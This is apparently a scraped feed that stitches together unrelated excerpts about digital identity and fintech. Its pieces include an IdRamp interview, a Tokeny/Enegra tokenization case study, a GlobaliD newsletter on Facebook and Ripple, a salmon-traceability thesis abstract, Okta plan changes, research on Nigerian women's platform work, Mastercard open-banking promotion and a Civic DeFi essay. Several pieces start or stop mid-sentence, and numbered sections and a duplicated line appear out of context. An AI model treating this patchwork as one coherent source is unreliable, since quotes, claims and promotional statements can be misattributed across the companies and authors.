<p>The problems and challenges of enterprise security have been getting worse and worse over the past decade—Zero Trust identity provides much needed relief. However, the next iteration of Zero Trust will require a decentralized network to remove the need for centralized databases that carry inherent risks and increased costs. Being a Node Operator helps IdRamp provide a more comprehensive Zero Trust service to our customers.</p>
<p>Where do you see the future of Self Sovereign Identity/Decentralized Identity?</p>
<p>The need for secure identity is a high priority because the cost of a mistake with personal data can be very expensive. Terms like “SSI” and “decentralized” will eventually fade into globally accepted standard terms for digital identity. As decentralized identity becomes the preferred security standard, new threats and attacks will be developed and new Zero Trust-solutions will be required. With Idramp, organizations can stay ahead of the rapidly changing digital identity security landscape and avoid expensive technical detours that slow business and leak revenue.</p>

			 Enegra’s tokenized equity improves the liquidity of its $28Bn balance sheet via T-REX Platform<br>
 
<p>Enegra sought to provide liquidity and great UX for its investors while remaining compliant on the public blockchain. Enegra turned to Tokeny’s innovative digital asset compliance infrastructure to issue, manage and transfer its equity on the blockchain. Tokeny’s solution allows Enegra to achieve a seamless outcome without the worry of technical barriers. The highlighted results are:</p>

		 
	 
      <p>Improved liquidity</p>      <p>Global and automated compliance</p>      <p>Zero transaction fees</p>                              We tokenized our equity to improve liquidity. And, now that the technology is available for faster, cheaper, and compliant transactions on the blockchain, we wanted our investors to take advantage of it. Polygon and Tokeny provided the complete infrastructure we needed to do so, and we are extremely pleased with the results.  Matthew AverayManaging Director &amp; CEO at Enegra        
	 
		 
			 Introduction 
<p><a href="https://www.enegragroup.com/">Enegra</a> was established in Malaysia in 2011, with a mission to enable mid-tier commodity miners in emerging markets to compete globally, Enegra achieves this through its world-class trading expertise, risk management, logistics, and governance – thereby delivering economic security among mid-tier mining communities whose lack of trading expertise often leaves them exploited on price.</p>
 Why Enegra tokenized its equity 
<p>Earlier 2019, Enegra’s management team explored asset tokenization, and team was fascinated by the concept and the advantages it brings to the company as an issuer, along the liquidity benefits to its investors. The following benefits meet exactly what Enegra sought to achieve for its new equity offering:</p>
 
 Improved liquidity 
 Automated compliance 
 Real-time cap table 
 Low administration and asset transfer costs 
 Control securities 
 Directly connect with investors 
 
 Compliantly tokenizing assets since 2019 
<p>Later in 2019, Enegra embarked on a search for a suitable tokenization platform to issue and manage its equity-backed security tokens on a public blockchain in a compliant manner, along with the necessary controls in place. Tokeny’s <a href="https://tokeny.com/t-rex-platform/">T-REX Platform</a> caught Enegra’s attention for two main reasons:</p>
 
 First: it leverages the public blockchain while bringing compliance and control. It achieves this through a unique <a href="https://tokeny.com/onchain-finance-leveraging-decentralized-technology-for-capital-markets-infrastructure/">onchain compliance approach</a> by whitelisting of digital identity not the wallet for maximum security, e.g: when investors lose their wallets, issuers can recover the tokens for them. 
 Second: it provides the most advanced platform (120+ functions) with the best user experience in the market. 
 
<p>In September 2019, Enegra issued its equity-backed EGX security tokens via Tokeny’s T-REX Platform on Ethereum. From then on, Enegra has been managing its security tokens and investors through the same platform.</p>
 Improving the UX further: say goodbye to gas fees 
<p>Earlier this year, Tokeny enhanced its blockchain layer to start supporting Polygon, a scalable layer 2 solution, to provide a faster, cheaper and compliant infrastructure for its customers. In addition, <a href="https://tokeny.com/tokeny-has-solved-the-problem-of-gas-fees/">the Gas Tank solution</a> was introduced to make the transaction fees free for platform users, eliminating infrastructure costs and troublesome processes.</p>
<p>To enhance the user experience of its security token holders, Enegra upgraded its services with Tokeny last month:</p>
 
 Migrated security tokens to Polygon&nbsp; 
 Implemented the Gas Tank solution

The Facebook&nbsp;problem More like Facebook First, Photo: Maurizio&nbsp;Pesce<p>It hasn’t been the greatest month for Facebook. The WSJ published <a href="https://www.wsj.com/articles/the-facebook-files-11631713039">a series of scathing exposees</a> highlighting the kinds of choices the company’s leadership regularly makes when faced with the option to expand profits versus “do the right thing.” (Which then doesn’t match their public proclamations of “doing better.”)</p><p>That in and of itself isn’t going to be much of a surprise to most people. The Facebook brand doesn’t have a ton of credibility these days. But seeing the nitty gritty details is still jarring — especially when <a href="https://www.wsj.com/articles/facebook-knows-instagram-is-toxic-for-teen-girls-company-documents-show-11631620739?mod=article_inline">we’re talking about children’s mental&nbsp;health</a>.</p><p>We now know who we owe these nitty gritty details, too — a company whistleblower known as “Sean.” Here actual name is Frances Haugen, <a href="https://www.nytimes.com/2021/10/03/technology/whistle-blower-facebook-frances-haugen.html">according to a New York Times&nbsp;report</a>.</p><p>In any case, Matt Levine has <a href="https://www.bloomberg.com/opinion/articles/2021-10-04/facebook-whistleblower-shows-a-shift-in-shareholder-values-away-from-profits">a straightforward breakdown of the situation</a>:</p><blockquote>Okay fine. Facebook is a for-profit company with obligations to its shareholders, and at various points it has a choice between doing pro-social things that are expensive or doing anti-social things that maximize its profits. Sometimes (she asserts, and I don’t particularly disagree) it chooses profit over public good. This is not a huge surprise, incentives being what they are, but it is good for policymakers and the public to know about the particular cases. It is good because, if we know about these choices, we can make informed decisions about regulation and enforcement. If Facebook sometimes chose to break the law to maximize profit, then regulators should punish it. If everything that Facebook does to maximize profits is legal, but some of it is horrible, then we should write new laws to make the horrible stuff illegal. If Facebook does things that are bad for the world then policymakers should try to make it stop. Basic&nbsp;stuff.</blockquote><p>That’s the inherent issue with a top-down platform that’s incentivized to maximize engagement and sharing in order to leverage its users’ data by serving them ads. Sometimes you need regulators to come in to whip them into&nbsp;shape.</p><p>Here comes the shameless plug. With Facebook, Messenger, WhatsApp, and Instagram all down today, why not try <a href="https://medium.com/global-id/globalid-messaging-is-end-to-end-encrypted-by-default-9c5d5e7d199d">a bottom-up messenger that preserves your digital privacy and that is end-to-end encrypted by default</a>? (Shameless plug idea courtesy of GlobaliD Developer Support Engineer Paul&nbsp;Keen.)</p> 2. Facebook shelves Instagram Kids initiative <p>But sometimes, all you need is a bright enough light. After the WSJ<a href="https://www.wsj.com/articles/facebook-documents-instagram-teens-11632953840"> published Facebook’s internal documents about Instagram and teens</a>, the company has dutifully shelved the&nbsp;project.</p><p>Here’s <a href="https://www.axios.com/instagram-pause-kids-platform-scrutiny-4f42fa4f-4dcd-411f-b44a-33ef5f18436e.html">Axios</a>:</p><blockquote>Instagram announced Monday that it is pausing its plans to develop a version of its platform for children under&nbsp;13.</blockquote><blockquote>Why it matters: Facebook has received backlash since the Wall Street Journal published a report that showed the company knew its Instagram app is harmful to teenagers.</blockquote><blockquote>…</blockquote><blockquote>By the numbers: The Journal revealed that Facebook was aware that, among teenage users, 13% of British users and 6% of American users traced the desire to kill themselves to Instagram.</blockquote><blockquote>What they’re saying: “While we stand by the need to develop this experience, we’ve decided to pause this project. This will give us time to work with parents, experts, policymakers and regulators, to listen to their concerns, and to demonstrate the value and importance of this project for younger teens online today,” Mosseri&nbsp;said.</blockquote><blockquote>…</blockquote><blockquote>What’s next: The Senate is scheduled to hold a hearing on Thursday to address “Facebook’s research into the impact of its apps on young audiences, its actions to address threats to these users, and policy considerations to safeguard kids&nbsp;online.”</blockquote><p>Whistleblower Frances Haugen is also scheduled to testify before the Senate tomorrow.</p><p>Relevant:</p>  <a href="https://www.wsj.com/articles/facebook-documents-instagram-teens-11632953840">Facebook’s Documents About Instagram and Teens, Published</a>  <a href="https://www.axios.com/instagram-pause-kids-platform-scrutiny-4f42fa4f-4dcd-411f-b44a-33ef5f18436e.html">Instagram pauses development of platform for&nbsp;kids</a>  <a href="https://www.axios.com/facebook-whistleblower-60-minutes-d2fba3d9-5fef-4aef-b2f8-6244e215b1ed.html">Facebook whistleblower’s “60 Minutes” interview puts face to bombshell allegations</a>  <a href="https://www.nytimes.com/2021/10/03/technology/whistle-blower-facebook-frances-haugen.html">Whistle-Blower Says Facebook ‘Chooses Profits Over&nbsp;Safety’</a>  Via RD — <a href="https://www.washingtonpost.com/technology/2021/09/26/ask-company-delete-personal-data/">Companies are hoarding personal data about you.

While the best-known NFTs tend to be art and collectibles, the fund will aim to support other use cases as well, like interactive experiences and fractional ownership, the according to the statement. Mintable, mintNFT and VSA Partners will also be involved, Ripple&nbsp;said.</blockquote><blockquote>“While NFTs have opened the door for a tokenized future, actually navigating these concepts is a different ballgame for many,” said Monica Long, general manager of RippleX at Ripple. “By starting with marketplaces and creators, our fund seeks to take the guesswork out of NFT projects to unlock unexplored tokenization use cases on the XRP&nbsp;Ledger.”</blockquote><p>Relevant:</p>  Via <a href="http://global.id/coddsquad">/coddsquad</a> — <a href="https://cointelegraph.com/news/ripple-launches-250m-fund-for-nft-creators">Ripple launches $250M fund for NFT&nbsp;creators</a>  <a href="https://www.bloomberg.com/news/articles/2021-09-29/ripple-starts-250-million-fund-to-woo-would-be-nft-creators?sref=T4JOT60j">Ripple Starts $250 Million Fund to Woo Would-Be NFT&nbsp;Creators</a>  Via <a href="http://global.id/j">/j</a> — <a href="https://www.theblockcrypto.com/linked/119057/twitter-exec-reveals-test-footage-of-verification-tools-for-nft-profile-pictures">Twitter reveals beta test of verification tools for NFT profile&nbsp;pictures</a>   4.

         A Case Study of Norwegian Salmon for the Chinese Market 
<p>Master thesis by Andreas Høieggen Steensæth</p>
<blockquote>
<p>I also want to thank Stephan Nilsson, CEO and founder of UNISOT for introducing me to<br>
potential interview respondents, for expert advice and taking the time for nearly weekly<br>
follow-up meetings in which he was available for questioning and advice. Additionally, I<br>
would like to thank Torje Vingen Sunde, CFO of UNISOT, for also participating in these<br>
meetings, offering suggestions and giving feedback throughout the process.</p>
</blockquote>
<p>In a dynamic and highly globalized world supply chains are complex and demanding to manage, and it is difficult to achieve full transparency and traceability. In China, a nation with substantial history of food scandals, the outbreak of covid-19 has recently increased the attention toward food safety and traceability.</p>
<p>This thesis aims to identify supply chain and traceability challenges Norwegian seafood is faced with in the Chinese market, the potential instruments that can meet the challenges, and how blockchain technologies potentially can meet the challenges. In order to accomplish this, there has been conducted a literature research that has examined the seafood supply chain, the Chinese market, traceability and blockchain technologies. Furthermore, for the primary research, there has been conducted semi-structured interviews with five informants with expert knowledge of Norwegian seafood, the Chinese market, and/or blockchain technologies, and a supply chain map has been constructed.</p>
<p>The findings identified 14 challenges related to supply chain, traceability and political areas. In order to assess how blockchain can improve several of the challenges, the challenges “policies”, “participation”, and “tampering” were selected to illustrate how blockchain technology can contribute to solving these. It was concluded that the unique properties of blockchain technology has the potential to meet several of the challenges identified related to supply chain management and implementation of traceability.</p>

We’ve since been busy, working out how our products will work together to help developers provide the best experiences for their users.

   An Update on Our Developer Offering 

<p>As many of you may know, Okta completed the acquisition of Auth0 in May of 2021. We’ve since been busy, working out how our products will work together to help developers provide the best experiences for their users. If you joined us for <a href="https://www.youtube.com/playlist?list=PLshTZo9V1-aHrVURzggebSWeltPQ4KCex">Developer Day</a>, you saw Okta and Auth0 showcase interesting projects happening at our companies and in our communities.</p>

<p>In the months since the Auth0 acquisition, one of the most important areas we’ve focused on is how to clarify and streamline our product offerings for developers. That work has led to some changes to Okta’s developer plans, announced in this post.</p>

 Changes to the Okta Developer Advanced Plan 

<p>First, we will no longer offer the Okta Developer Advanced paid plan for new signups.  Developers who want to get started with a pay-as-you-go experience should instead use <a href="https://auth0.com/pricing">Auth0’s plans</a>, which provide flexible options based on usage and features. Auth0’s offering also includes a generous free plan. Developers who are currently using the Okta Developer Advanced plan will continue to receive the same level of service and support they originally signed up for, without needing to change terms or migrate to Auth0. If you are a developer currently on the Okta Developer Advanced plan and you decide to upgrade or change your plan, you will need to work with an Okta sales representative to find the plan that best meets your needs.</p>

 Meet Okta Developer Edition 

<p>Second, the Developer Starter free plan, now known as Okta Developer Edition, will function as a playground where developers can explore and build their projects in a full-featured, pre-production Okta environment. Okta Developer Edition includes 100 monthly active users (MAUs) and is intended for all developers, whether you’re evaluating Okta’s products or creating something for the <a href="https://www.okta.com/okta-integration-network/">Okta Integration Network</a>. Okta Developer Edition will remain completely free. Developers who are already using the Developer Starter free plan with a 15k user limit will continue to enjoy their current allocation of free MAU until they reach the 15k limit, at which point they will need to upgrade to a paid plan.</p>

<p>We know plan changes can be disruptive, and it can be a challenge to understand potential impacts to your current and prospective projects. We believe that these changes will, in the end, clarify the differences between Okta and Auth0 developer offerings. Our goal is to give developers everything they need to explore the functionality the Okta environment provides while providing a clear path to Auth0 for developers who want a fully self-service experience.</p>

 Country Landscape Review <p>Authors: Raymond Onuoha (<a href="mailto:ronuoha@lbs.edu.ng">ronuoha@lbs.edu.ng</a>), Olayinka David-West (<a href="mailto:ydavid-west@lbs.edu.ng">ydavid-west@lbs.edu.ng</a>), Renée Hunter (<a href="mailto:rhunter@v4w.org">rhunter@v4w.org</a>)</p><p>We are starting a new research project — and we’d like you to join us on the journey. Over the course of 2021, Lagos Business School and Value for Women, in partnership with Caribou Digital, and with the support of the Mastercard Foundation, aim to understand the experiences of young women working or trading through digital platforms in Nigeria. We are particularly interested in uncovering whether and how such activities contribute to their economic empowerment, and the extent to which COVID-19 has impacted this. The study also builds on previous work on <a href="https://medium.com/caribou-digital/platform-livelihoods-working-trading-renting-and-engaging-in-digital-marketplaces-b144ffcc1141">platform livelihoods</a> by both Caribou Digital and researchers at Qhala in Kenya. It is also part of wider ongoing research on <a href="https://medium.com/caribou-digital/how-can-we-make-platform-livelihoods-better-for-young-women-especially-during-and-after-covid-19-696b3974bf61">platforms livelihoods and women</a> that includes additional studies in <a href="https://medium.com/caribou-digital/researching-gender-and-platform-livelihoods-in-ghana-9359ec3f55b0">Ghana</a> and&nbsp;<a href="https://medium.com/caribou-digital/women-and-platform-livelihoods-in-kenya-the-impact-of-covid-19-954d6b073997">Kenya</a>.</p> (Un)employment in Nigeria: A need to look beyond the formal&nbsp;sector <p>Nigeria is Africa’s largest economy, with over 200 million people, millions of whom are currently underutilized. Despite several government interventions to drive economic activity and consequently create (formal) jobs, Nigeria’s unemployment rate has continued to rapidly climb in the last decade. Although the data does depend on the exact definition of “unemployment rate,” unemployment rose from <a href="https://www.ng.undp.org/content/nigeria/en/home/library/human_development/undp-nigeria-annual-report-2016.html">3.5% in 2006 to 33% in 2020</a>; The country currently <a href="https://www.nigerianstat.gov.ng/elibrary.?queries[search]=unemployment">ranks</a> 164 out of 182 in global unemployment.</p><p>A closer look at the numbers shows that some groups — especially women — are harder hit than others in terms of obtaining employment. Overall, 23% of the labor force work only 20–39 hours per week, and 16% work less than 20 hours per week. Delving into different age ranges and genders provides an even more nuanced picture: youth (15–34 years) are faced with the highest unemployment (45%), and 35% of women are unemployed, with an additional 24% being underemployed (20–39 hours per week). The higher-than-average figures for these social groups indicate that the talents of especially young women are currently underutilized, making online opportunities all the more interesting and important for these&nbsp;groups.</p><p>Figure 1 presents a breakdown of the labor population.</p>Figure 1: Nigeria’s Labour Statistics, Q4 2020. Source: NBS The categories in this figure mean the following:<br>● Working age range: 15–64 years<br>● Labour force: members of the working age that are able and willing to work<br>● Fully employed: worked 40+ hours per week<br>● Underemployed: worked between 20–39 hours per&nbsp;week<p>Some of the barriers keeping (young) women out of employment include traditional gender roles and biases, lower literacy rates, and lower rates of access to mobile phones and internet connectivity. For example, 49% of men (compared to 34% of women) agree that a university education is more important for a boy than for a girl, and 74% of men (compared to 55% of women) agree that, when jobs are scarce, <a href="https://www.worldvaluessurvey.org/WVSDocumentationWV7.jsp">men should have more right to employment than women</a>. Gaps in educational attainment start long before university, with <a href="https://data.worldbank.org/indicator/SE.ADT.1524.LT.FE.ZS?locations=NG">literacy rates for young women </a>in Nigeria at 68%, compared to young men at 82% — 1.2 times as high. Access to <a href="https://www.gsma.com/mobilefordevelopment/wp-content/uploads/2020/05/GSMA-The-Mobile-Gender-Gap-Report-2020.pdf">information and learning opportunities</a> is hampered by gaps in mobile internet usage, which for women in Nigeria stand at 38%, in contrast to that for men at 54% — 1.4 times as&nbsp;high.</p><p>With the limited scope of the formal sector to employ people in general, individuals are looking elsewhere for their livelihoods. This is not new; in fact, 93% of working Nigerians are <a href="https://www.ilo.org/wcmsp5/groups/public/---dgreports/---dcomm/documents/publication/wcms_626831.pdf">informally employed</a> (women more than men). The increasing number of digital platforms provides an attractive avenue for individuals to earn a livelihood outside the parameters of formal employment.</p> Online platforms: Potential to fill women’s livelihood gaps? <p>Nigeria’s digital economy has seen rapid growth in the last five years. As of 2019, there were an estimated 138 <a href="https://cenfri.org/wp-content/uploads/07.2020_Nigeria-Digital-platform-landscape.pdf">digital platforms</a> active in the country (of which 80% are homegrown). Freelancing platforms are the most common (35), followed by marketplace platforms (32) and ride-hailing apps (21). These digital platforms act as virtual marketplaces that connect buyers and sellers of goods and services. Determining the number of individuals earning a livelihood through these platforms is difficult, due to challenges in definitions and data collection. Recent estimates range from as little as<a href="https://cenfri.org/wp-content/uploads/Policy-options-for-regulating-platform-work_Nov-2020-2.pdf"> 0.01% of the labor force</a> to almost <a href="https://cenfri.org/wp-content/uploads/i2i-ADP-infographic-2018.pdf">three million individuals</a>. When individuals conducting business via social platforms (such as WhatsApp, Facebook, or Instagram) are included, estimates are even&nbsp;higher.</p><p>The key drivers of growth within the Nigerian platform ecosystem include a large, young, and entrepreneurial population, as well as an active ecosystem that incorporates digital start-ups (estimated up to <a href="https://www.isc.hbs.edu/Documents/resources/courses/moc-course-at-harvard/pdf/student-projects/Lagos_ICT_2017.pdf">700</a>), incubators, and venture capital firms. This is particularly true in Lagos, which generates the most economic activity in the country — accounting for <a href="https://www.isc.hbs.edu/Documents/resources/courses/moc-course-at-harvard/pdf/student-projects/Lagos_ICT_2017.pdf">25% of national GDP</a> and <a href="https://datareportal.com/reports/digital-2021-nigeria">18%</a> of all <a href="https://nairametrics.com/2021/03/30/fct-lagos-3-other-states-gain-highest-internet-subscribers-in-2020/">Nigerian internet users</a>. While other urban areas are also seeing an uptick in the use of digital platforms, rural areas remain behind due to a digital divide underpinned by lack of internet access, affordability, and digital literacy and&nbsp;skills.</p><p>Nigerian women have been moving towards online livelihoods. A demand-side survey conducted between 2017 and 2018 shows that, among internet users, <a href="https://media.africaportal.org/documents/2019_After-Access_Africa-Comparative-report.pdf">women are 1.6 times more likely</a> than men to earn income via online means. In and of itself, this is interesting, given the higher levels of economic participation among men generally, but it is even more so when compared to data from other countries in Africa, which shows that this trend is generally reversed elsewhere, as observed on microwork platforms (see Table 1). In addition to the imperative of finding livelihoods outside of traditional means (as described above), <a href="https://cenfri.org/wp-content/uploads/FINAL_Nigeria-e-hailing-note_Aug-2020.pdf">reasons for preferring online work</a> include flexibility, the opportunity to work from home, and the potential for significantly higher earnings.</p><p>However, gendered gaps and dynamics remain. First, it is important to remember that the figures in Table 1 refer to the percentage of internet users that earn a livelihood via online platforms. Given the prevailing digital divide (for one, according to the <a href="https://www.gsma.com/r/wp-content/uploads/2021/06/The-Mobile-Gender-Gap-Report-2021.pdf">GSMA</a>, 56% of men compared to only 40% of women in Nigeria make use of mobile internet), women have more hurdles to overcome before they are able to access and productively use mobile internet, and subsequently online platforms. Moreover, <a href="https://opendocs.ids.ac.uk/opendocs/bitstream/handle/20.500.12413/14727/597_Gender_Roles_in_Nigerian_Labour_Market.pdf?sequence=1">women’s (analogue) employment</a> is concentrated in economic sectors such as agriculture, small-scale commerce, and the informal sector. Initial cross-country evidence shows that <a href="https://cenfri.org/wp-content/uploads/i2i-ADP-infographic-2018.pdf">similar differences </a>might remain when moving to online livelihoods.</p><p>Table 1: Digital Platform microwork participation in select African countries disaggregated by gender. Source: Gillwald and Onkokame&nbsp;(2019).</p><p>We intend to further investigate the potential of online platforms to meet the need for more income-generating opportunities for young Nigerian women. We think of women’s (economic) empowerment in digital platforms as the relative ease with which women have access to these platforms and mobilize them for sustainable socio-economic capital.</p><p>Online platforms might contribute to women’s (economic) empowerment through facilitating income-generation, coupled with flexibility and autonomy, which provides more opportunities for women to be self-sufficient and combine a decent livelihood with their other responsibilities. In Nigeria, with the impact of the COVID-19 pandemic, women entrepreneurs (mostly low-income) working in open markets had to <a href="https://www.womensworldbanking.org/insights-and-impact/covid-19-unlocks-e-commerce-digital-finance-among-low-income-women-in-nigeria/">pivot their trading activities to online platforms</a>, even though many were previously unbanked and undigitized. This shift became imperative because of the increased migration to online shopping. For these women, going digital was a survivalist option to retain their clientele and potentially expand their operations during the lockdown.</p><p>However, studies show that some digital platforms exploit online earners, which might further exacerbate gendered power dynamics. For example, <a href="https://cenfri.org/wp-content/uploads/Policy-options-for-regulating-platform-work_Nov-2020-2.pdf">certain platform practices</a>, such as the ability to block users due to bad reviews, put earners at a significant disadvantage. And online environments are not removed from the biases prevalent in offline environments;<a href="https://www.platformlivelihoods.com/qydel2020/"> forthcoming research by Caribou Digital</a> finds that freelancers in the Global South can find it beneficial to pretend to be based in Europe or the United States, as they find it increases their likelihood of getting jobs. We might expect to see similar biases impact the online livelihoods of women (remember that almost ¾ of Nigerian men agree that jobs should go to men when they are in high demand!).</p><p>Different stakeholders have different roles to play in creating opportunities for women’s online livelihoods. State interventions, for example, can set <a href="https://cenfri.org/wp-content/uploads/Policy-options-for-regulating-platform-work_Nov-2020-2.pdf">regulatory requirements for platforms</a> and apply <a href="https://doi.org/10.14662/IJPSD2017.025">interventions to labor relations</a> overall. In Nigeria the <a href="http://socialprotectionng.com/share/Nigeria%20National%20Social%20Protection%20Policy%20-%20Draft%202016.pdf">2016 National Social Protection Policy</a> establishes a gender-sensitive and age-appropriate framework for enhancing women livelihoods, though it does not recognize online work; the <a href="https://www.decentjobsforyouth.org/commitment/190">Nigeria Youth Employment Action Plan (NYEAP)</a> targets young people within the age range of 18–35 for employment creation in critical sectors of the economy; and the <a href="https://nigerianwomentrustfund.org/wp-content/uploads/National-Gender-PolicySituation-Analysis.pdf">National Gender Policy of 2006</a> aims to mainstream women’s rights across economic sectors. Thus far, however, these policies have not significantly shifted private sector practices from traditional values and power dynamics.</p><p>Online platforms can apply a gender lens to their activities to de-bias their structures and provide more protection to the individuals using them. While work has been done to establish international standards on best practices for online platforms (see, for example, the work done by the <a href="https://fair.work/en/fw/homepage/">Fairwork Foundation</a>), to our knowledge this is not yet prevalent through a gender&nbsp;lens.</p><p>The development and research communities have roles in unearthing evidence, bringing parties together to learn, and making recommendations! This is precisely where our current project comes&nbsp;in.</p> Our approach  Our key questions are: <p>1) In what ways might platform work empower&nbsp;women?</p><p>2) How can we make platforms work better for&nbsp;women?</p><p>We will undertake qualitative research to answer these questions. This will consist of focus groups and in-depth interviews with women earning livelihoods through online channels — both as gig workers and micro-entrepreneurs — and in-depth expert interviews with ecosystem stakeholders, including civil society, platforms, digital finance providers, regulators, and other private sector&nbsp;actors.</p><p>We will use a participatory video storytelling method to dig deeper into the lived experiences of select female workers by giving them the tools (a phone, video training, and mentoring) to tell their story. See Caribou DIgital’s previous<a href="https://www.platformlivelihoods.com/covid-19-video-project/"> participatory video storytelling project </a>with gig&nbsp;workers.</p><p>We will also engage digital platforms directly through a Gender Self-Assessment Survey, conducted via <a href="https://www.v4w.org/gendersmartnexus/">Value for Women’s Gender Smart Nexus</a>. This standardized assessment measures the levels of gender inclusion for different types of businesses. We will adapt this survey to platform operations specifically, allowing us to summarize trends in platforms’ focuses and approaches. This tool will subsequently be available for other platforms to use, and we invite you to get in touch should you be interested in applying it to your own operations!</p> Get involved <p>Between July and September, we will engage with online earners, digital platforms, experts, and other interested folks. Should you be interested in a conversation with us about your work, or feel that there is a certain individual we simply must interview — please don’t hesitate to send us an email! We’ll publish a consolidated country report by the end of 2021, and will share updates on our findings as we move&nbsp;along.</p><p>Raymond Onuoha (ronuoha@lbs.edu.ng)</p><p>Prof. Olayinka David-West — Lagos Business School (ydavid-west@lbs.edu.ng)</p><p>Renée Hunter — Value for Women (rhunter@v4w.org)</p> <p><a href="https://medium.com/caribou-digital/online-livelihoods-and-young-womens-economic-empowerment-in-nigeria-ccbbea4020e2">Online livelihoods and young women’s economic empowerment in Nigeria</a> was originally published in <a href="https://medium.com/caribou-digital">Caribou Digital</a> on Medium, where people are continuing the conversation by highlighting and responding to this story.</p>

<p>Mastercard’s Jess Turner, EVP New Digital Infrastructure and Fintech, was featured in PYMNTS The Way Payments Are Now Done eBook discussing how account opening needs to follow customer expectations to provide the best experience possible. You can read the full report at <a href="https://securecdn.pymnts.com/wp-content/uploads/2021/09/2021-10-eBook-Q3-Responses-V2-mpc.pdf">PYMNTS</a>, but here’s what she had to say:&nbsp;</p>
<p>As we contend with in-person restrictions, the demand for and use of digital financial services has grown. Mobile banking, account opening or making real-time payments are now not only our first reflex but often a necessity. <a href="https://www.mastercard.com/news/research-reports/2020/the-global-state-of-pay/">Mastercard’s 2020 Global State of Pay</a> study found 73% percent of consumers and 67% of small businesses had used mobile banking apps to manage their finances and make payments in the past 12 months, and 53% of consumers said they were using them more now than they had before.</p>
<p>Consumers want flexibility in how they manage their finances, and true financial services innovators are delivering experiences that provide this choice. Opening checking accounts online is increasingly part of a consumer’s normal payments routine, and it is powered by open banking, which has also seen significant acceleration during COVID-19 and is expanding globally. Nearly two-thirds (64%) of the checking accounts opened during the height of the pandemic were submitted either online or on a mobile device with more than eight in ten banking app users reporting the experience was “easier than they thought.” That’s largely due to open banking.</p>
<p>Digital account opening is here to stay, and consumers expect to open an account in seconds. But issues like manual uploads and micro-deposits add delays. Open banking introduces new ways for financial institutions and apps to verify account ownership and authenticate credentials for opening and funding accounts. The balance of risk, compliance and customer experience is delicate – efficiency can’t compromise fraud prevention. Trust is critical in our hyper-connected digital environment and the consumer must be at the center of control, ensuring greater transparency.</p>
<p>That’s why we have a solution that provides secure, lightning-fast account verification. Mastercard’s open banking network is removing friction points in the account setup, onboarding and funding process. Open banking introduces new ways for financial institutions to verify account ownership and authenticate credentials for opening and funding that include account owners, account details, and balances that boost sign-ups and reduce abandonment. The connectivity is also useful when customers have an existing relationship with a financial institution but want to move money or add services. Data services help financial institutions verify account details and balances in milliseconds while moving money accurately and securely.&nbsp;&nbsp;</p>
<p>With the rapid emergence and global expansion of open banking, the money experience will never be the same. At Mastercard, we are redesigning our network to power the future of payments and services. A global open banking network, coupled with our existing multi-rail expertise, empowers our partners to better serve consumers and their changing expectations with digital experiences.</p>

<p>The Future Now Problem blurs the lines between what is feasible NOW and what is only going to be possible in the FUTURE.</p>
<p>NOTE: This article is going to evolve and be updated. I likely won’t announce all of the changes.</p>
<p>The decentralized identity/SSI space is particularly good at creating and exacerbating this problem. We’re working through, with several clients, planning production deployment and the Future Now Problem keeps cropping up. There are so many issues here that I could probably write a small book – though I won’t .</p>
<p>For a quick briefer I recorded a quick Loom video – that I will replace with newer versions as the message gets crisper:</p>
  
<p>When the idea of what is available right NOW is blurred among the ideas of the FUTURE,&nbsp;you can’t differentiate between what is feasible TODAY from what is not ready for prime time.</p>
<p>As an example, there are ongoing issues in many of the “standards” that are driving the industry. Most of the standards haven’t been passed and if they have, they have enough vaguaries that compliance is easy but interoperability is a non-starter. So the sharp projects are working through many of the interop and other issues in their own ecosystems and making progress. In order to do that, they are critically examining where the Future Now Problem has led them astray.</p>
<p>This takes hard work and the ability to operate in a trusted environment. We’re happy to help our clients understand what is NOW and what is FUTURE (and how to plan for and influence that future).&nbsp;</p>

 SUMMARY 



  Since Bitcoin’s inception, blockchain technology has radically transformed finance.&nbsp;  However, none of the new-world benefits of Decentralized Finance (DeFi) may be sustained without adherence to evolving regulatory standards.&nbsp;  Civic CEO Chris Hart explores the past, present and future of DeFi.  



 In banks we trust(ed) 



<p>Not long ago, when someone talked about finance, there was no need to qualify what type of finance they were referring to. Centralized Finance, CeFi now, was the only option. This was true not because innovative ideas were lacking, but because large, central, state-sponsored or legacy financial institutions held all the cards.&nbsp;</p>



<blockquote><p>The structural friction and inherent inequities controlling financial systems resisted the standing up of a new bank, exchange or regulated entity, and prevented all but the most advantaged institutions from participating in anything other than a transactional relationship.&nbsp;</p></blockquote>



<p>For example, when you look at securities trading in the US, most exchanges are owned by a precious few companies, including the Intercontinental Exchange, which is the NYSE’s parent company, Cboe Global Markets or Nasdaq.&nbsp;</p>



<p>To be sure, there are a few upstart new entrants in the last couple of years, but mostly the exchanges have changed little in the past couple of decades.</p>



 But blockchain and crypto change all that, don’t they? 



<p>With the advent of blockchain and crypto currencies, what is striking is how much has changed, and how so many things still remain the same.</p>



<p>In centralized crypto exchanges (CEX), as in traditional finance (TradFi), enforcement of regulatory compliance rules like Know Your Customer (KYC) and Anti Money Laundering (AML), and the structural friction inherent in the granting process of licenses are the mechanisms by which winners and losers have emerged. And with that, the emergence of CeFi for the crypto world has largely occurred.&nbsp;</p>



<blockquote><p>A few large crypto institutions hosting central limit order books, lending and other financial services now cater to millions of users worldwide.</p></blockquote>



<p>In effect, CeFi for crypto took the legacy exchange model, albeit with the addition of broker functionalities and removal of the need for clearinghouses, and rebooted it for a new asset class:</p>



  



 Disintermediation of finance: why are we walking but not yet running? 



<p>In many ways, the blockchain developments of the last 13 years have rewritten the rulebook, enabling permissionless innovation of Decentralized Exchanges (DEXs) such as Automated Market Makers (AMMs) and decentralized central limit order books, Lending Protocols, and the advent of DeFi in general. These products and services, among others, have provided tremendous value to their users.&nbsp;</p>



<p>DeFi’s thesis is particularly well suited to replacing important aspects of the centralized finance stack: trading logic (smart contracts / protocols), custody (non-custodial wallets), and security (on-chain elimination of counterparty risk / auditable contracts):</p>



  



<p>However, in other important ways <a href="https://www.wsj.com/articles/cryptos-defi-projects-arent-immune-to-regulation-secs-gensler-says-11629365401">the rules remain the same</a> for compliance, regulatory oversight and capital markets. The argument goes that it remains crucial to ensure basic safeguards remain in place to curtail bad actors and to provide guardrails for retail investors for whom loss of funds could be monumental.&nbsp;</p>



<blockquote><p>What is clear, is that the days of treating regulatory compliance as irrelevant to DeFi, or imagining that somehow the blockchain paradigm exempts the new breed of Fintechs from basic checks like KYC, are coming to a close.</p><p></p></blockquote>



